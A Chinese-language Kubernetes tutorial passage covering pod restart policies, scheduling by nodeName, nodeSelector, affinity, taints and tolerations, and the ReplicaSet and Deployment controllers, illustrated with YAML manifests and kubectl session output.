重启策略适用于pod对象中的所有容器，首次需要重启的容器，将在其需要时立即进行重启，随后再次需要重启的操作将由kubelet延迟一段时间后进行，且反复的重启操作的延迟时长以此为10s、20s、40s、80s、160s和300s，300s是最大延迟时长。 创建pod-restartpolicy.yaml： 123456789101112131415161718apiVersion: v1kind: Podmetadata: name: pod-restartpolicy namespace: devspec: containers: - name: nginx image: nginx:1.17.1 ports: - name: nginx-port containerPort: 80 livenessProbe: httpGet: scheme: HTTP port: 80 path: /hello restartPolicy: Never # 设置重启策略为Never 运行Pod测试 1234567891011121314# 创建Pod[root@k8s-master01 ~]# kubectl create -f pod-restartpolicy.yamlpod/pod-restartpolicy created# 查看Pod详情，发现nginx容器失败[root@k8s-master01 ~]# kubectl describe pods pod-restartpolicy -n dev...... Warning Unhealthy 15s (x3 over 35s) kubelet, node1 Liveness probe failed: HTTP probe failed with statuscode: 404 Normal Killing 15s kubelet, node1 Container nginx failed liveness probe # 多等一会，再观察pod的重启次数，发现一直是0，并未重启 [root@k8s-master01 ~]# kubectl get pods pod-restartpolicy -n devNAME READY STATUS RESTARTS AGEpod-restartpolicy 0/1 Running 0 5min42s Pod调度在默认情况下，一个Pod在哪个Node节点上运行，是由Scheduler组件采用相应的算法计算出来的，这个过程是不受人工控制的。但是在实际使用中，这并不满足的需求，因为很多情况下，我们想控制某些Pod到达某些节点上，那么应该怎么做呢？这就要求了解kubernetes对Pod的调度规则，kubernetes提供了四大类调度方式： 自动调度：运行在哪个节点上完全由Scheduler经过一系列的算法计算得出 定向调度：NodeName、NodeSelector 亲和性调度：NodeAffinity、PodAffinity、PodAntiAffinity 污点（容忍）调度：Taints、Toleration 定向调度定向调度，指的是利用在pod上声明nodeName或者nodeSelector，以此将Pod调度到期望的node节点上。注意，这里的调度是强制的，这就意味着即使要调度的目标Node不存在，也会向上面进行调度，只不过pod运行失败而已。 NodeName NodeName用于强制约束将Pod调度到指定的Name的Node节点上。这种方式，其实是直接跳过Scheduler的调度逻辑，直接将Pod调度到指定名称的节点。 接下来，实验一下：创建一个pod-nodename.yaml文件 12345678910apiVersion: v1kind: Podmetadata: name: pod-nodename namespace: devspec: containers: - name: nginx image: nginx:1.17.1 nodeName: node1 # 指定调度到node1节点上 1234567891011121314151617181920#创建Pod[root@k8s-master01 ~]# kubectl create -f pod-nodename.yamlpod/pod-nodename created#查看Pod调度到NODE属性，确实是调度到了node1节点上[root@k8s-master01 ~]# kubectl get pods pod-nodename -n dev -o wideNAME READY STATUS RESTARTS AGE IP NODE ......pod-nodename 1/1 Running 0 56s 10.244.1.87 node1 ...... # 接下来，删除pod，修改nodeName的值为node3（并没有node3节点）[root@k8s-master01 ~]# kubectl delete -f pod-nodename.yamlpod &quot;pod-nodename&quot; deleted[root@k8s-master01 ~]# vim pod-nodename.yaml[root@k8s-master01 ~]# kubectl create -f pod-nodename.yamlpod/pod-nodename created#再次查看，发现已经向Node3节点调度，但是由于不存在node3节点，所以pod无法正常运行[root@k8s-master01 ~]# kubectl get pods pod-nodename -n dev -o wideNAME READY STATUS RESTARTS AGE IP NODE ......pod-nodename 0/1 Pending 0 6s &lt;none&gt; node3 ...... NodeSelector NodeSelector用于将pod调度到添加了指定标签的node节点上。它是通过kubernetes的label-selector机制实现的，也就是说，在pod创建之前，会由scheduler使用MatchNodeSelector调度策略进行label匹配，找出目标node，然后将pod调度到目标节点，该匹配规则是强制约束。 接下来，实验一下： 1 首先分别为node节点添加标签 1234[root@k8s-master01 ~]# kubectl label nodes node1 nodeenv=pronode/node2 labeled[root@k8s-master01 ~]# kubectl label nodes node2 nodeenv=testnode/node2 labeled 2 创建一个pod-nodeselector.yaml文件，并使用它创建Pod 1234567891011apiVersion: v1kind: Podmetadata: name: pod-nodeselector namespace: devspec: containers: - name: nginx image: nginx:1.17.1 nodeSelector: nodeenv: pro # 指定调度到具有nodeenv=pro标签的节点上 12345678910111213141516171819202122232425262728#创建Pod[root@k8s-master01 ~]# kubectl create -f pod-nodeselector.yamlpod/pod-nodeselector created#查看Pod调度到NODE属性，确实是调度到了node1节点上[root@k8s-master01 ~]# kubectl get pods pod-nodeselector -n dev -o wideNAME READY STATUS RESTARTS AGE IP NODE ......pod-nodeselector 1/1 Running 0 47s 10.244.1.87 node1 ......# 接下来，删除pod，修改nodeSelector的值为nodeenv: xxxx（不存在打有此标签的节点）[root@k8s-master01 ~]# kubectl delete -f pod-nodeselector.yamlpod &quot;pod-nodeselector&quot; deleted[root@k8s-master01 ~]# vim pod-nodeselector.yaml[root@k8s-master01 ~]# kubectl create -f pod-nodeselector.yamlpod/pod-nodeselector created#再次查看，发现pod无法正常运行,Node的值为none[root@k8s-master01 ~]# kubectl get pods -n dev -o wideNAME READY STATUS RESTARTS AGE IP NODE pod-nodeselector 0/1 Pending 0 2m20s &lt;none&gt; &lt;none&gt;# 查看详情,发现node selector匹配失败的提示[root@k8s-master01 ~]# kubectl describe pods pod-nodeselector -n dev.......Events: Type Reason Age From Message ---- ------ ---- ---- ------- Warning FailedScheduling &lt;unknown&gt; default-scheduler 0/3 nodes are available: 3 node(s) didn't match node selector. 亲和性调度上一节，介绍了两种定向调度的方式，使用起来非常方便，但是也有一定的问题，那就是如果没有满足条件的Node，那么Pod将不会被运行，即使在集群中还有可用Node列表也不行，这就限制了它的使用场景。 基于上面的问题，kubernetes还提供了一种亲和性调度（Affinity）。它在NodeSelector的基础之上的进行了扩展，可以通过配置的形式，实现优先选择满足条件的Node进行调度，如果没有，也可以调度到不满足条件的节点上，使调度更加灵活。 Affinity主要分为三类： nodeAffinity(node亲和性）: 以node为目标，解决pod可以调度到哪些node的问题 podAffinity(pod亲和性) : 以pod为目标，解决pod可以和哪些已存在的pod部署在同一个拓扑域中的问题 podAntiAffinity(pod反亲和性) : 以pod为目标，解决pod不能和哪些已存在pod部署在同一个拓扑域中的问题 关于亲和性(反亲和性)使用场景的说明： 亲和性：如果两个应用频繁交互，那就有必要利用亲和性让两个应用的尽可能的靠近，这样可以减少因网络通信而带来的性能损耗。 反亲和性：当应用的采用多副本部署时，有必要采用反亲和性让各个应用实例打散分布在各个node上，这样可以提高服务的高可用性。 NodeAffinity 首先来看一下NodeAffinity的可配置项： 12345678910111213141516pod.spec.affinity.nodeAffinity requiredDuringSchedulingIgnoredDuringExecution Node节点必须满足指定的所有规则才可以，相当于硬限制 nodeSelectorTerms 节点选择列表 matchFields 按节点字段列出的节点选择器要求列表 matchExpressions 按节点标签列出的节点选择器要求列表(推荐) key 键 values 值 operator 关系符 支持Exists, DoesNotExist, In, NotIn, Gt, Lt preferredDuringSchedulingIgnoredDuringExecution 优先调度到满足指定的规则的Node，相当于软限制 (倾向) preference 一个节点选择器项，与相应的权重相关联 matchFields 按节点字段列出的节点选择器要求列表 matchExpressions 按节点标签列出的节点选择器要求列表(推荐) key 键 values 值 operator 关系符 支持In, NotIn, Exists, DoesNotExist, Gt, Lt weight 倾向权重，在范围1-100。 1234567891011关系符的使用说明:- matchExpressions: - key: nodeenv # 匹配存在标签的key为nodeenv的节点 operator: Exists - key: nodeenv # 匹配标签的key为nodeenv,且value是&quot;xxx&quot;或&quot;yyy&quot;的节点 operator: In values: [&quot;xxx&quot;,&quot;yyy&quot;] - key: nodeenv # 匹配标签的key为nodeenv,且value大于&quot;xxx&quot;的节点 operator: Gt values: &quot;xxx&quot; 接下来首先演示一下requiredDuringSchedulingIgnoredDuringExecution , 创建pod-nodeaffinity-required.yaml 1234567891011121314151617apiVersion: v1kind: Podmetadata: name: pod-nodeaffinity-required namespace: devspec: containers: - name: nginx image: nginx:1.17.1 affinity: #亲和性设置 nodeAffinity: #设置node亲和性 requiredDuringSchedulingIgnoredDuringExecution: # 硬限制 nodeSelectorTerms: - matchExpressions: # 匹配env的值在[&quot;xxx&quot;,&quot;yyy&quot;]中的标签 - key: nodeenv operator: In values: [&quot;xxx&quot;,&quot;yyy&quot;] 12345678910111213141516171819202122232425262728293031# 创建pod[root@k8s-master01 ~]# kubectl create -f pod-nodeaffinity-required.yamlpod/pod-nodeaffinity-required created# 查看pod状态 （运行失败）[root@k8s-master01 ~]# kubectl get pods pod-nodeaffinity-required -n dev -o wideNAME READY STATUS RESTARTS AGE IP NODE ...... pod-nodeaffinity-required 0/1 Pending 0 16s &lt;none&gt; &lt;none&gt; ......# 查看Pod的详情# 发现调度失败，提示node选择失败[root@k8s-master01 ~]# kubectl describe pod pod-nodeaffinity-required -n dev...... Warning FailedScheduling &lt;unknown&gt; default-scheduler 0/3 nodes are available: 3 node(s) didn't match node selector. Warning FailedScheduling &lt;unknown&gt; default-scheduler 0/3 nodes are available: 3 node(s) didn't match node selector.#接下来，停止pod[root@k8s-master01 ~]# kubectl delete -f pod-nodeaffinity-required.yamlpod &quot;pod-nodeaffinity-required&quot; deleted# 修改文件，将values: [&quot;xxx&quot;,&quot;yyy&quot;]------&gt; [&quot;pro&quot;,&quot;yyy&quot;][root@k8s-master01 ~]# vim pod-nodeaffinity-required.yaml# 再次启动[root@k8s-master01 ~]# kubectl create -f pod-nodeaffinity-required.yamlpod/pod-nodeaffinity-required created# 此时查看，发现调度成功，已经将pod调度到了node1上[root@k8s-master01 ~]# kubectl get pods pod-nodeaffinity-required -n dev -o wideNAME READY STATUS RESTARTS AGE IP NODE ...... pod-nodeaffinity-required 1/1 Running 0 11s 10.244.1.89 node1 ...... 接下来再演示一下requiredDuringSchedulingIgnoredDuringExecution , 创建pod-nodeaffinity-preferred.yaml 123456789101112131415161718apiVersion: v1kind: Podmetadata: name: pod-nodeaffinity-preferred namespace: devspec: containers: - name: nginx image: nginx:1.17.1 affinity: #亲和性设置 nodeAffinity: #设置node亲和性 preferredDuringSchedulingIgnoredDuringExecution: # 软限制 - weight: 1 preference: matchExpressions: # 匹配env的值在[&quot;xxx&quot;,&quot;yyy&quot;]中的标签(当前环境没有) - key: nodeenv operator: In values: [&quot;xxx&quot;,&quot;yyy&quot;] 12345678# 创建pod[root@k8s-master01 ~]# kubectl create -f pod-nodeaffinity-preferred.yamlpod/pod-nodeaffinity-preferred created# 查看pod状态 （运行成功）[root@k8s-master01 ~]# kubectl get pod pod-nodeaffinity-preferred -n devNAME READY STATUS RESTARTS AGEpod-nodeaffinity-preferred 1/1 Running 0 40s 12345NodeAffinity规则设置的注意事项： 1 如果同时定义了nodeSelector和nodeAffinity，那么必须两个条件都得到满足，Pod才能运行在指定的Node上 2 如果nodeAffinity指定了多个nodeSelectorTerms，那么只需要其中一个能够匹配成功即可 3 如果一个nodeSelectorTerms中有多个matchExpressions ，则一个节点必须满足所有的才能匹配成功 4 如果一个pod所在的Node在Pod运行期间其标签发生了改变，不再符合该Pod的节点亲和性需求，则系统将忽略此变化 PodAffinity PodAffinity主要实现以运行的Pod为参照，实现让新创建的Pod跟参照pod在一个区域的功能。 首先来看一下PodAffinity的可配置项： 123456789101112131415161718192021pod.spec.affinity.podAffinity requiredDuringSchedulingIgnoredDuringExecution 硬限制 namespaces 指定参照pod的namespace topologyKey 指定调度作用域 labelSelector 标签选择器 matchExpressions 按节点标签列出的节点选择器要求列表(推荐) key 键 values 值 operator 关系符 支持In, NotIn, Exists, DoesNotExist. matchLabels 指多个matchExpressions映射的内容 preferredDuringSchedulingIgnoredDuringExecution 软限制 podAffinityTerm 选项 namespaces topologyKey labelSelector matchExpressions key 键 values 值 operator matchLabels weight 倾向权重，在范围1-100 123topologyKey用于指定调度时作用域,例如: 如果指定为kubernetes.io/hostname，那就是以Node节点为区分范围 如果指定为beta.kubernetes.io/os,则以Node节点的操作系统类型来区分 接下来，演示下requiredDuringSchedulingIgnoredDuringExecution, 1）首先创建一个参照Pod，pod-podaffinity-target.yaml： 123456789101112apiVersion: v1kind: Podmetadata: name: pod-podaffinity-target namespace: dev labels: podenv: pro #设置标签spec: containers: - name: nginx image: nginx:1.17.1 nodeName: node1 # 将目标pod名确指定到node1上 12345678# 启动目标pod[root@k8s-master01 ~]# kubectl create -f pod-podaffinity-target.yamlpod/pod-podaffinity-target created# 查看pod状况[root@k8s-master01 ~]# kubectl get pods pod-podaffinity-target -n devNAME READY STATUS RESTARTS AGEpod-podaffinity-target 1/1 Running 0 4s 2）创建pod-podaffinity-required.yaml，内容如下： 123456789101112131415161718apiVersion: v1kind: Podmetadata: name: pod-podaffinity-required namespace: devspec: containers: - name: nginx image: nginx:1.17.1 affinity: #亲和性设置 podAffinity: #设置pod亲和性 requiredDuringSchedulingIgnoredDuringExecution: # 硬限制 - labelSelector: matchExpressions: # 匹配env的值在[&quot;xxx&quot;,&quot;yyy&quot;]中的标签 - key: podenv operator: In values: [&quot;xxx&quot;,&quot;yyy&quot;] topologyKey: kubernetes.io/hostname 上面配置表达的意思是：新Pod必须要与拥有标签nodeenv=xxx或者nodeenv=yyy的pod在同一Node上，显然现在没有这样pod，接下来，运行测试一下。 12345678910111213141516171819202122232425262728293031# 启动pod[root@k8s-master01 ~]# kubectl create -f pod-podaffinity-required.yamlpod/pod-podaffinity-required created# 查看pod状态，发现未运行[root@k8s-master01 ~]# kubectl get pods pod-podaffinity-required -n devNAME READY STATUS RESTARTS AGEpod-podaffinity-required 0/1 Pending 0 9s# 查看详细信息[root@k8s-master01 ~]# kubectl describe pods pod-podaffinity-required -n dev......Events: Type Reason Age From Message ---- ------ ---- ---- ------- Warning FailedScheduling &lt;unknown&gt; default-scheduler 0/3 nodes are available: 2 node(s) didn't match pod affinity rules, 1 node(s) had taints that the pod didn't tolerate.# 接下来修改 values: [&quot;xxx&quot;,&quot;yyy&quot;]-----&gt;values:[&quot;pro&quot;,&quot;yyy&quot;]# 意思是：新Pod必须要与拥有标签nodeenv=xxx或者nodeenv=yyy的pod在同一Node上[root@k8s-master01 ~]# vim pod-podaffinity-required.yaml# 然后重新创建pod，查看效果[root@k8s-master01 ~]# kubectl delete -f pod-podaffinity-required.yamlpod &quot;pod-podaffinity-required&quot; deleted[root@k8s-master01 ~]# kubectl create -f pod-podaffinity-required.yamlpod/pod-podaffinity-required created# 发现此时Pod运行正常[root@k8s-master01 ~]# kubectl get pods pod-podaffinity-required -n devNAME READY STATUS RESTARTS AGE LABELSpod-podaffinity-required 1/1 Running 0 6s &lt;none&gt; 关于PodAffinity的 preferredDuringSchedulingIgnoredDuringExecution，这里不再演示。 PodAntiAffinity PodAntiAffinity主要实现以运行的Pod为参照，让新创建的Pod跟参照pod不在一个区域中的功能。 它的配置方式和选项跟PodAffinty是一样的，这里不再做详细解释，直接做一个测试案例。 1）继续使用上个案例中目标pod 1234[root@k8s-master01 ~]# kubectl get pods -n dev -o wide --show-labelsNAME READY STATUS RESTARTS AGE IP NODE LABELSpod-podaffinity-required 1/1 Running 0 3m29s 10.244.1.38 node1 &lt;none&gt; pod-podaffinity-target 1/1 Running 0 9m25s 10.244.1.37 node1 podenv=pro 2）创建pod-podantiaffinity-required.yaml，内容如下： 123456789101112131415161718apiVersion: v1kind: Podmetadata: name: pod-podantiaffinity-required namespace: devspec: containers: - name: nginx image: nginx:1.17.1 affinity: #亲和性设置 podAntiAffinity: #设置pod亲和性 requiredDuringSchedulingIgnoredDuringExecution: # 硬限制 - labelSelector: matchExpressions: # 匹配podenv的值在[&quot;pro&quot;]中的标签 - key: podenv operator: In values: [&quot;pro&quot;] topologyKey: kubernetes.io/hostname 上面配置表达的意思是：新Pod必须要与拥有标签nodeenv=pro的pod不在同一Node上，运行测试一下。 123456789# 创建pod[root@k8s-master01 ~]# kubectl create -f pod-podantiaffinity-required.yamlpod/pod-podantiaffinity-required created# 查看pod# 发现调度到了node2上[root@k8s-master01 ~]# kubectl get pods pod-podantiaffinity-required -n dev -o wideNAME READY STATUS RESTARTS AGE IP NODE .. pod-podantiaffinity-required 1/1 Running 0 30s 10.244.1.96 node2 .. 污点和容忍污点（Taints） 前面的调度方式都是站在Pod的角度上，通过在Pod上添加属性，来确定Pod是否要调度到指定的Node上，其实我们也可以站在Node的角度上，通过在Node上添加污点属性，来决定是否允许Pod调度过来。 Node被设置上污点之后就和Pod之间存在了一种相斥的关系，进而拒绝Pod调度进来，甚至可以将已经存在的Pod驱逐出去。 污点的格式为：key=value:effect, key和value是污点的标签，effect描述污点的作用，支持如下三个选项： PreferNoSchedule：kubernetes将尽量避免把Pod调度到具有该污点的Node上，除非没有其他节点可调度 NoSchedule：kubernetes将不会把Pod调度到具有该污点的Node上，但不会影响当前Node上已存在的Pod NoExecute：kubernetes将不会把Pod调度到具有该污点的Node上，同时也会将Node上已存在的Pod驱离 使用kubectl设置和去除污点的命令示例如下： 12345678# 设置污点kubectl taint nodes node1 key=value:effect# 去除污点kubectl taint nodes node1 key:effect-# 去除所有污点kubectl taint nodes node1 key- 接下来，演示下污点的效果： 准备节点node1（为了演示效果更加明显，暂时停止node2节点） 为node1节点设置一个污点: tag=heima:PreferNoSchedule；然后创建pod1( pod1 可以 ) 修改为node1节点设置一个污点: tag=heima:NoSchedule；然后创建pod2( pod1 正常 pod2 失败 ) 修改为node1节点设置一个污点: tag=heima:NoExecute；然后创建pod3 ( 3个pod都失败 ) 12345678910111213141516171819202122232425262728293031# 为node1设置污点(PreferNoSchedule)[root@k8s-master01 ~]# kubectl taint nodes node1 tag=heima:PreferNoSchedule# 创建pod1[root@k8s-master01 ~]# kubectl run taint1 --image=nginx:1.17.1 -n dev[root@k8s-master01 ~]# kubectl get pods -n dev -o wideNAME READY STATUS RESTARTS AGE IP NODE taint1-7665f7fd85-574h4 1/1 Running 0 2m24s 10.244.1.59 node1 # 为node1设置污点(取消PreferNoSchedule，设置NoSchedule)[root@k8s-master01 ~]# kubectl taint nodes node1 tag:PreferNoSchedule-[root@k8s-master01 ~]# kubectl taint nodes node1 tag=heima:NoSchedule# 创建pod2[root@k8s-master01 ~]# kubectl run taint2 --image=nginx:1.17.1 -n dev[root@k8s-master01 ~]# kubectl get pods taint2 -n dev -o wideNAME READY STATUS RESTARTS AGE IP NODEtaint1-7665f7fd85-574h4 1/1 Running 0 2m24s 10.244.1.59 node1 taint2-544694789-6zmlf 0/1 Pending 0 21s &lt;none&gt; &lt;none&gt; # 为node1设置污点(取消NoSchedule，设置NoExecute)[root@k8s-master01 ~]# kubectl taint nodes node1 tag:NoSchedule-[root@k8s-master01 ~]# kubectl taint nodes node1 tag=heima:NoExecute# 创建pod3[root@k8s-master01 ~]# kubectl run taint3 --image=nginx:1.17.1 -n dev[root@k8s-master01 ~]# kubectl get pods -n dev -o wideNAME READY STATUS RESTARTS AGE IP NODE NOMINATED taint1-7665f7fd85-htkmp 0/1 Pending 0 35s &lt;none&gt; &lt;none&gt; &lt;none&gt; taint2-544694789-bn7wb 0/1 Pending 0 35s &lt;none&gt; &lt;none&gt; &lt;none&gt; taint3-6d78dbd749-tktkq 0/1 Pending 0 6s &lt;none&gt; &lt;none&gt; &lt;none&gt; 12小提示： 使用kubeadm搭建的集群，默认就会给master节点添加一个污点标记,所以pod就不会调度到master节点上. 容忍（Toleration） 上面介绍了污点的作用，我们可以在node上添加污点用于拒绝pod调度上来，但是如果就是想将一个pod调度到一个有污点的node上去，这时候应该怎么做呢？这就要使用到容忍。 污点就是拒绝，容忍就是忽略，Node通过污点拒绝pod调度上去，Pod通过容忍忽略拒绝 下面先通过一个案例看下效果： 上一小节，已经在node1节点上打上了NoExecute的污点，此时pod是调度不上去的 本小节，可以通过给pod添加容忍，然后将其调度上去 创建pod-toleration.yaml,内容如下 1234567891011121314apiVersion: v1kind: Podmetadata: name: pod-toleration namespace: devspec: containers: - name: nginx image: nginx:1.17.1 tolerations: # 添加容忍 - key: &quot;tag&quot; # 要容忍的污点的key operator: &quot;Equal&quot; # 操作符 value: &quot;heima&quot; # 容忍的污点的value effect: &quot;NoExecute&quot; # 添加容忍的规则，这里必须和标记的污点规则相同 123456789# 添加容忍之前的pod[root@k8s-master01 ~]# kubectl get pods -n dev -o wideNAME READY STATUS RESTARTS AGE IP NODE NOMINATED pod-toleration 0/1 Pending 0 3s &lt;none&gt; &lt;none&gt; &lt;none&gt; # 添加容忍之后的pod[root@k8s-master01 ~]# kubectl get pods -n dev -o wideNAME READY STATUS RESTARTS AGE IP NODE NOMINATEDpod-toleration 1/1 Running 0 3s 10.244.1.62 node1 &lt;none&gt; 下面看一下容忍的详细配置: 12345678[root@k8s-master01 ~]# kubectl explain pod.spec.tolerations......FIELDS: key # 对应着要容忍的污点的键，空意味着匹配所有的键 value # 对应着要容忍的污点的值 operator # key-value的运算符，支持Equal和Exists（默认） effect # 对应污点的effect，空意味着匹配所有影响 tolerationSeconds # 容忍时间, 当effect为NoExecute时生效，表示pod在Node上的停留时间 Pod控制器详解Pod控制器介绍Pod是kubernetes的最小管理单元，在kubernetes中，按照pod的创建方式可以将其分为两类： 自主式pod：kubernetes直接创建出来的Pod，这种pod删除后就没有了，也不会重建 控制器创建的pod：kubernetes通过控制器创建的pod，这种pod删除了之后还会自动重建 什么是Pod控制器 Pod控制器是管理pod的中间层，使用Pod控制器之后，只需要告诉Pod控制器，想要多少个什么样的Pod就可以了，它会创建出满足条件的Pod并确保每一个Pod资源处于用户期望的目标状态。如果Pod资源在运行中出现故障，它会基于指定策略重新编排Pod。 在kubernetes中，有很多类型的pod控制器，每种都有自己的适合的场景，常见的有下面这些： ReplicationController：比较原始的pod控制器，已经被废弃，由ReplicaSet替代 ReplicaSet：保证副本数量一直维持在期望值，并支持pod数量扩缩容，镜像版本升级 Deployment：通过控制ReplicaSet来控制Pod，并支持滚动升级、回退版本 Horizontal Pod Autoscaler：可以根据集群负载自动水平调整Pod的数量，实现削峰填谷 DaemonSet：在集群中的指定Node上运行且仅运行一个副本，一般用于守护进程类的任务 Job：它创建出来的pod只要完成任务就立即退出，不需要重启或重建，用于执行一次性任务 Cronjob：它创建的Pod负责周期性任务控制，不需要持续后台运行 StatefulSet：管理有状态应用 ReplicaSet(RS)ReplicaSet的主要作用是保证一定数量的pod正常运行，它会持续监听这些Pod的运行状态，一旦Pod发生故障，就会重启或重建。同时它还支持对pod数量的扩缩容和镜像版本的升降级。 ReplicaSet的资源清单文件： 123456789101112131415161718192021222324apiVersion: apps/v1 # 版本号kind: ReplicaSet # 类型 metadata: # 元数据 name: # rs名称 namespace: # 所属命名空间 labels: #标签 controller: rsspec: # 详情描述 replicas: 3 # 副本数量 selector: # 选择器，通过它指定该控制器管理哪些pod matchLabels: # Labels匹配规则 app: nginx-pod matchExpressions: # Expressions匹配规则 - {key: app, operator: In, values: [nginx-pod]} template: # 模板，当副本数量不足时，会根据下面的模板创建pod副本 metadata: labels: app: nginx-pod spec: containers: - name: nginx image: nginx:1.17.1 ports: - containerPort: 80 在这里面，需要新了解的配置项就是spec下面几个选项： replicas：指定副本数量，其实就是当前rs创建出来的pod的数量，默认为1 selector：选择器，它的作用是建立pod控制器和pod之间的关联关系，采用的Label Selector机制 在pod模板上定义label，在控制器上定义选择器，就可以表明当前控制器能管理哪些pod了 template：模板，就是当前控制器创建pod所使用的模板板，里面其实就是前一章学过的pod的定义 创建ReplicaSet 创建pc-replicaset.yaml文件，内容如下： 123456789101112131415161718apiVersion: apps/v1kind: ReplicaSet metadata: name: pc-replicaset namespace: devspec: replicas: 3 selector: matchLabels: app: nginx-pod template: metadata: labels: app: nginx-pod spec: containers: - name: nginx image: nginx:1.17.1 12345678910111213141516171819# 创建rs[root@k8s-master01 ~]# kubectl create -f pc-replicaset.yamlreplicaset.apps/pc-replicaset created# 查看rs# DESIRED:期望副本数量 # CURRENT:当前副本数量 # READY:已经准备好提供服务的副本数量[root@k8s-master01 ~]# kubectl get rs pc-replicaset -n dev -o wideNAME DESIRED CURRENT READY AGE CONTAINERS IMAGES SELECTORpc-replicaset 3 3 3 22s nginx nginx:1.17.1 app=nginx-pod# 查看当前控制器创建出来的pod# 这里发现控制器创建出来的pod的名称是在控制器名称后面拼接了-xxxxx随机码[root@k8s-master01 ~]# kubectl get pod -n devNAME READY STATUS RESTARTS AGEpc-replicaset-6vmvt 1/1 Running 0 54spc-replicaset-fmb8f 1/1 Running 0 54spc-replicaset-snrk2 1/1 Running 0 54s 扩缩容 12345678910111213141516171819202122232425262728293031323334# 编辑rs的副本数量，修改spec:replicas: 6即可[root@k8s-master01 ~]# kubectl edit rs pc-replicaset -n devreplicaset.apps/pc-replicaset edited# 查看pod[root@k8s-master01 ~]# kubectl get pods -n devNAME READY STATUS RESTARTS AGEpc-replicaset-6vmvt 1/1 Running 0 114mpc-replicaset-cftnp 1/1 Running 0 10spc-replicaset-fjlm6 1/1 Running 0 10spc-replicaset-fmb8f 1/1 Running 0 114mpc-replicaset-s2whj 1/1 Running 0 10spc-replicaset-snrk2 1/1 Running 0 114m# 当然也可以直接使用命令实现# 使用scale命令实现扩缩容， 后面--replicas=n直接指定目标数量即可[root@k8s-master01 ~]# kubectl scale rs pc-replicaset --replicas=2 -n devreplicaset.apps/pc-replicaset scaled# 命令运行完毕，立即查看，发现已经有4个开始准备退出了[root@k8s-master01 ~]# kubectl get pods -n devNAME READY STATUS RESTARTS AGEpc-replicaset-6vmvt 0/1 Terminating 0 118mpc-replicaset-cftnp 0/1 Terminating 0 4m17spc-replicaset-fjlm6 0/1 Terminating 0 4m17spc-replicaset-fmb8f 1/1 Running 0 118mpc-replicaset-s2whj 0/1 Terminating 0 4m17spc-replicaset-snrk2 1/1 Running 0 118m#稍等片刻，就只剩下2个了[root@k8s-master01 ~]# kubectl get pods -n devNAME READY STATUS RESTARTS AGEpc-replicaset-fmb8f 1/1 Running 0 119mpc-replicaset-snrk2 1/1 Running 0 119m 镜像升级 123456789101112131415161718# 编辑rs的容器镜像 - image: nginx:1.17.2[root@k8s-master01 ~]# kubectl edit rs pc-replicaset -n devreplicaset.apps/pc-replicaset edited# 再次查看，发现镜像版本已经变更了[root@k8s-master01 ~]# kubectl get rs -n dev -o wideNAME DESIRED CURRENT READY AGE CONTAINERS IMAGES ...pc-replicaset 2 2 2 140m nginx nginx:1.17.2 ...# 同样的道理，也可以使用命令完成这个工作# kubectl set image rs rs名称 容器=镜像版本 -n namespace[root@k8s-master01 ~]# kubectl set image rs pc-replicaset nginx=nginx:1.17.1 -n devreplicaset.apps/pc-replicaset image updated# 再次查看，发现镜像版本已经变更了[root@k8s-master01 ~]# kubectl get rs -n dev -o wideNAME DESIRED CURRENT READY AGE CONTAINERS IMAGES ...pc-replicaset 2 2 2 145m nginx nginx:1.17.1 ... 删除ReplicaSet 123456789101112131415161718# 使用kubectl delete命令会删除此RS以及它管理的Pod# 在kubernetes删除RS前，会将RS的replicasclear调整为0，等待所有的Pod被删除后，在执行RS对象的删除[root@k8s-master01 ~]# kubectl delete rs pc-replicaset -n devreplicaset.apps &quot;pc-replicaset&quot; deleted[root@k8s-master01 ~]# kubectl get pod -n dev -o wideNo resources found in dev namespace.# 如果希望仅仅删除RS对象（保留Pod），可以使用kubectl delete命令时添加--cascade=false选项（不推荐）。[root@k8s-master01 ~]# kubectl delete rs pc-replicaset -n dev --cascade=falsereplicaset.apps &quot;pc-replicaset&quot; deleted[root@k8s-master01 ~]# kubectl get pods -n devNAME READY STATUS RESTARTS AGEpc-replicaset-cl82j 1/1 Running 0 75spc-replicaset-dslhb 1/1 Running 0 75s# 也可以使用yaml直接删除(推荐)[root@k8s-master01 ~]# kubectl delete -f pc-replicaset.yamlreplicaset.apps &quot;pc-replicaset&quot; deleted Deployment(Deploy)为了更好的解决服务编排的问题，kubernetes在V1.2版本开始，引入了Deployment控制器。值得一提的是，这种控制器并不直接管理pod，而是通过管理ReplicaSet来简介管理Pod，即：Deployment管理ReplicaSet，ReplicaSet管理Pod。所以Deployment比ReplicaSet功能更加强大。 Deployment主要功能有下面几个： 支持ReplicaSet的所有功能 支持发布的停止、继续 支持滚动升级和回滚版本 Deployment的资源清单文件： 1234567891011121314151617181920212223242526272829303132apiVersion: apps/v1 # 版本号kind: Deployment # 类型 metadata: # 元数据 name: # rs名称 namespace: # 所属命名空间 labels: #标签 controller: deployspec: # 详情描述 replicas: 3 # 副本数量 revisionHistoryLimit: 3 # 保留历史版本 paused: false # 暂停部署，默认是false progressDeadlineSeconds: 600 # 部署超时时间（s），默认是600 strategy: # 策略 type: RollingUpdate # 滚动更新策略 rollingUpdate: # 滚动更新 maxSurge: 30% # 最大额外可以存在的副本数，可以为百分比，也可以为整数 maxUnavailable: 30% # 最大不可用状态的 Pod 的最大值，可以为百分比，也可以为整数 selector: # 选择器，通过它指定该控制器管理哪些pod matchLabels: # Labels匹配规则 app: nginx-pod matchExpressions: # Expressions匹配规则 - {key: app, operator: In, values: [nginx-pod]} template: # 模板，当副本数量不足时，会根据下面的模板创建pod副本 metadata: labels: app: nginx-pod spec: containers: - name: nginx image: nginx:1.17.1 ports: - containerPort: 80 创建deployment 创建pc-deployment.yaml，内容如下： 123456789101112131415161718apiVersion: apps/v1kind: Deployment metadata: name: pc-deployment namespace: devspec: replicas: 3 selector: matchLabels: app: nginx-pod template: metadata: labels: app: nginx-pod spec: containers: - name: nginx image: nginx:1.17.1 1234567891011121314151617181920212223# 创建deployment[root@k8s-master01 ~]# kubectl create -f pc-deployment.yaml --record=truedeployment.apps/pc-deployment created# 查看deployment# UP-TO-DATE 最新版本的pod的数量# AVAILABLE 当前可用的pod的数量[root@k8s-master01 ~]# kubectl get deploy pc-deployment -n devNAME READY UP-TO-DATE AVAILABLE AGEpc-deployment 3/3 3 3 15s# 查看rs# 发现rs的名称是在原来deployment的名字后面添加了一个10位数的随机串[root@k8s-master01 ~]# kubectl get rs -n devNAME DESIRED CURRENT READY AGEpc-deployment-6696798b78 3 3 3 23s# 查看pod[root@k8s-master01 ~]# kubectl get pods -n devNAME READY STATUS RESTARTS AGEpc-deployment-6696798b78-d2c8n 1/1 Running 0 107spc-deployment-6696798b78-smpvp 1/1 Running 0 